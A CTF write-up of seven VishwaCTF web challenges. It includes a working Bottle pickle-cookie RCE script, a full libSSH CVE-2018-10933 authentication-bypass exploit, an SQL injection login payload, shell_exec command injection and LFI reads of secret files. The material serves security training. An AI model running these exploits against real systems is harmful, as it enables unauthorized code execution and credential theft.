# Category : WEB

# CHALLENGE 1 : Trip to US

*Description: IIT kharakpur is organizing a US Industrial Visit. The cost of the registration is $1000. But as always there is an opportunity for intelligent minds. Find the hidden login and Get the flag to get yourself a free US trip ticket.*

In this challenge we are given a we a website : 
![trip0](https://hackmd.io/_uploads/H1562FNap.png)

after i clicked in `click here` a page with errors is being displayed and it says you are not an IITIAN
I opened burpsuite and changed the agent to `IITIAN` : 
![trip](https://hackmd.io/_uploads/rJ5pnKVaa.png)
then this login page appears:
![trip1](https://hackmd.io/_uploads/Sk9p2KVpT.png)

```
gobuster dir -u https://ch661069157784.ch.eng.run -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ch661069157784.ch.eng.run
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 339] [--> http://ch661069157784.ch.eng.run/Images/]
/db                   (Status: 301) [Size: 335] [--> http://ch661069157784.ch.eng.run/db/]
```
in db there is 2 files 	test_db.sql and users.sql 
in user.sql found this creds : 
```
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `user_name`, `password`, `name`) VALUES
(1, 'admin', 'unbre@k@BLE_24', 'admin');

```
Entering the creds we got our flag : 
![trip3](https://hackmd.io/_uploads/HkKp2YN66.png)

-----------
-----------

# CHALLENGE 2 : Prompt Injection

*Descrition: I have this collection of poems and whenever I am happy I have a look at them, hope you like it.*

The website contain 3 poems : 

![prom](https://hackmd.io/_uploads/B1Er2kB66.png)


when we click in one of them we see a parameter id that is vulnrable to LFI : 
https://ch681069157790.ch.eng.run/show?id=/app/app.py

```
from bottle import route, run, template, request, response, error
from config.secret import Vishwa
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=Vishwa)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=Vishwa)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=80)
``` 

as we can see in the code the file /app/config/secret.py contains the Cookie of the admin 

https://ch681069157790.ch.eng.run/show?id=/app/config/secret.py :
```
Vishwa = "trrrrrrrrrrrrryyyyyyyyyyyharddddddddd"
```

i find this exploit online : 
```
import os, hmac, hashlib, base64, pickle, requests

def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)

def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return str("" if s is None else s)

def create_cookie(name, value, secret):
    d = pickle.dumps([name, value], -1)
    encoded = base64.b64encode(d)
    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())
    value = touni(tob('!') + sig + tob('?') + encoded)
    return value

class PickleRCE(object):
    def __reduce__(self):
        return (exec,("""
from bottle import response
import subprocess,base64
flag = subprocess.check_output('/flag', shell=True)
response.set_header('X-Flag',base64.b64encode(flag))
""",))

session = {"name": PickleRCE()}
cookie = create_cookie("name", session, "trrrrrrrrrrrrryyyyyyyyyyyharddddddddd")

r = requests.get("https://ch681069157790.ch.eng.run/sign", cookies={"name": cookie})
print(base64.b64decode(r.headers["x-flag"]).decode("ascii"))
```
we got this : flag{W3lcome_t0_p03m_p0ck3t}

But in format it'll be this VishwaCTF{W3lcome_t0_p03m_p0ck3t}

-----
-----

# CHALLENGE 3 : MediCare Pharma

*Description: Greetings form MediCare Pharma!!!!*

*We have started a very new pharmacy where we have various surgical equipments (more to be added soon).*

*But recently some hackers took control of our server and changed a hell lot of things (probably wiped out everything). Luckily we have few of the accounts and we need more consumers on board. For security reasons, we have disabled SignUp, only authorised persons are allowed to login.*

*Have a look at our pharmacy and hope we grow again soon.*


In this challenge we got this website : 

![medicare1](https://hackmd.io/_uploads/Hy73jyrpa.png)

This is a login page, we cannot create an account since the sign up option is disabled.

![medicare2](https://hackmd.io/_uploads/B18inyBaa.png)

I tried to this credentials to login (username:"admin") and (password:"admin")

and i got this : 

![medicare3](https://hackmd.io/_uploads/rJEXaJBa6.png)

as soon as I saw this response of query select I taught of an SQL INJECTION so i tried different payloads from this git repository : https://github.com/payloadbox/sql-injection-payload-list

and was able to login using this payload `admin' OR 'x'='x`, i put it in both username and password and i got this result:

![medicare4](https://hackmd.io/_uploads/B1PL0kHTa.png)

nice, now i have some different credentials (usernames and passwords)

i tried to login using this credentials (username="rootuser") and (password="5trongp455%") 

i got this page : 

![medicare5](https://hackmd.io/_uploads/BywSJxB6a.png)


i tried to play with search bar and click on thoses buttons try some website features and test them, then i view the source code of the website and went and had a look on the js file called `login.js`

after analyzing it i noticed this part of code 

![medicare6](https://hackmd.io/_uploads/H1BM-lHp6.png)

so if i select at least 1 needle and click on buyALL i will have the file `login.php` downloaded and this file is important because it handles the submit of search

![medicare8](https://hackmd.io/_uploads/S1JaZxrpT.png)

as you can see the submitForm sends a post request to the login.php

here it's content after i have download it:

![medicare7](https://hackmd.io/_uploads/rk8gflra6.png)


if we look closely at the code we can see that out input can be executed though the shell_exec function in php, 
so that's very nice, the search form is vulnerable to command injection lets exploit it now

![medicare9](https://hackmd.io/_uploads/rk1_zeH66.png)

nice the output of ls gets alerted to us.


after trying different commands, i was able to find the flag using the command `cat ../../../root/flag.txt`

![medicare10](https://hackmd.io/_uploads/SksJXlS6p.png)

flag : `VishwaCTF{d1g1t4l_p41n_di5p4tch3d_th4nk5_f0r_sh0pp1ng_with_M3diC4re_Ph4rm4}`

-----
----- 
# CHALLENGE 4 : H34D3RS

*Description: Name of the challenge says something.*

This is the first thing i see when i load the website

![headers1](https://hackmd.io/_uploads/rJPzEgraa.png)

its says `But wait...you dont look like a lorbrowser user to me`

and so since the description is like a hint so we need to manipulate the headers in our get request and change user agent.

I use burpsuite to do this: 

![headers2](https://hackmd.io/_uploads/SyUaSgSa6.png)


and i got this result : 

![headers3](https://hackmd.io/_uploads/H1WMLgHp6.png)

now we need to make our request to seem like it comes from the vishwactf.com website, for that we will add the Referer header:

![headers4](https://hackmd.io/_uploads/rJqoIgBT6.png)


and i got this result : 

![headers5](https://hackmd.io/_uploads/S1BXPeB6a.png)


now we need to make our request seem like its comming from the futur, we need to add the header Date, since we are at 2024 we will add 20 years to that which makes 2044, at first i put this format for example Thu, 5 Feb 2044  14:10:38 GMT and it didnt work but after trying again and again different format i figureout to just pass 2044 to the header Date, but i don't know why the challenge needed to complicate this like that, its very annoying to be honest.


![headers6](https://hackmd.io/_uploads/SJsz_xH6a.png)

and i go this result:


![headers7](https://hackmd.io/_uploads/rkN_OgHa6.png)

we need to add here the security header called Upgrade-Insecure-Requests: 10 since 10 was in the string it was like a hint.

![headers8](https://hackmd.io/_uploads/BkXjteS6a.png)

and i got this result : 

![headers9](https://hackmd.io/_uploads/B12RKlrTp.png)

now we add the header Downlink with value 999999999

![headersdownlink](https://hackmd.io/_uploads/SyGvU-BTa.png)





we got the result:

![headers55](https://hackmd.io/_uploads/B1KlBWSTa.png)

flag : `VishwaCTF{s3cret_sit3_http_head3rs_r_c0o1}`


i reallly liked this challenge about headers because i learned a lot


-----
----- 
# CHALLENGE 5 : Save The City

*Description: The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!*


the first thing appears when i run the command `nc` is the ssh banner then after some time its says bye bye then closes

![savecity1](https://hackmd.io/_uploads/S1tUneHpp.png)


here i googled this `SSH-2.0-libssh_0.8.1` and found an exploit of this version here : https://github.com/blacknbunny/CVE-2018-10933



```
#!/usr/bin/env python3

# original exploit PoC reference https://github.com/blacknbunny/CVE-2018-10933
import paramiko
import socket
import argparse
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--command', help='Command to execute', default='id')
parser.add_argument('-log', '--logfile', help='Logfile to write conn logs', default="paramiko.log")

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port, command):

    # create a new socket    
    sock = socket.socket()
    try:
        # connect socket to specified host and port
        sock.connect((str(hostname), int(port)))

        # create message, and append MSG_USERAUTH_SUCCESS byte - this is the vulnerability
        # when libssh recieves this byte, it effectively bypasses all authentication and 
        # thinks the user was already successfully authenticated.
        # more detail can be found in the CVE entry here:
        # https://nvd.nist.gov/vuln/detail/cve-2018-10933 
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        # create an ssh client for the socket using paramiko
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        # send the crafted message
        transport._send_message(message)
    
        # execute the command specified
        spawncmd = transport.open_session(timeout=10)
        spawncmd.exec_command(command)
        
        # open the stdout of the connection with a 2048 byte buffer
        stdout = spawncmd.makefile("rb", 2048)
        # read the output and decode it to text
        output = stdout.read().decode('utf-8')
        # close the output buffer
        stdout.close()
        
        # print the output to the terminal
        print(output)
        
        return 0

    # catch all exceptions and print ssh related exceptions
    except paramiko.SSHException as e:
        print(e)
    except socket.error:
        print("Unable to connect.")
    return 1


def main():
    # try to use argparse to parse the arguments
    try:
        hostname = args.host
        port = args.port
        command = args.command
    # print usage and exit otherwise
    except:
        parser.print_help()
        exit(1)
    # if correct arguments, run the exploit.
    BypasslibSSHwithoutcredentials(hostname, port, command)

if __name__ == '__main__':
    sys.exit(main())

```

so i have succefully run it and did some commands and was able to retrieve the flag from location.txt running this command : `python3 cv.py --host 13.234.11.113 -p 30968 -c 'cat location.txt'
`

![savecity2](https://hackmd.io/_uploads/SkAL6lB66.png)

so the flag is : `VishwaCTF{elrow-club-pune}`



-----
----- 
# CHALLENGE 6 : Recipe Archival Workshop

*Description: New interns in the Recipe Archival Workshop have a simple task- upload images of yummy delicacies and dream about tasting them some day.*

we got this whe the site loads: 

![recipe1](https://hackmd.io/_uploads/SyLHuWBa6.png)


after playing with the upload button i tought of trying to do a reverse shell i was able to upload one by bypassing extension like `shell.php.jpeg` because the site accept only image extensions, i have successfully uploaded the file but i find it very hard to execute it i tried traversal path but i didnt go nowhere

after thinking and trying different image extensions i find out out that `.tiff` gave me the flag

![recipe2](https://hackmd.io/_uploads/ryxHFZB66.png)


![recipe3](https://hackmd.io/_uploads/rk5rFWHTa.png)


flag : `VishwaCTF{today_i_wanted_to_eat_a_croissant_QUASO}`






-----
----- 
# CHALLENGE 7 : They Are Coming

*Description: Aesthetic Looking army of 128 Robots with AGI Capabilities are coming to destroy our locality!*


we got this after the site loads:

![robots1](https://hackmd.io/_uploads/HkagqWSpa.png)

first thing i tought to do is to check the robots.txt since there is an image of a robot thats maybe a hint, and usually whenever i do a web challenge the first thing i do is to visit robots.txt 

and i got this : 

![robots2](https://hackmd.io/_uploads/HJuuqWrpa.png)


we have from here : 

hex : `L3NlY3JldC1sb2NhdGlvbg==`
decryption key : `th1s_1s_n0t_t5e_f1a9`


lets decode the hex : 

![robots3](https://hackmd.io/_uploads/SymJx7r6a.png)


we got `secret-location`, lets visit it:

![robots4](https://hackmd.io/_uploads/BJzmgXH6a.png)

from text we can deduce that this might be a hint for aes 128 encryption and since we already have the encryption key

after searching files i found in https://ch471069157855.ch.eng.run/static/js/main.25b1321e.js this : 
![robot](https://hackmd.io/_uploads/SyXt7mS66.png)
 which is the flag but encoded so let's go and decode it using our key : `th1s_1s_n0t_t5e_f1a9`
 
![aes](https://hackmd.io/_uploads/r10LKmH6a.png)

Flag is : VishwaCTF{g0_Su88m1t_1t_Qu14kl7}




















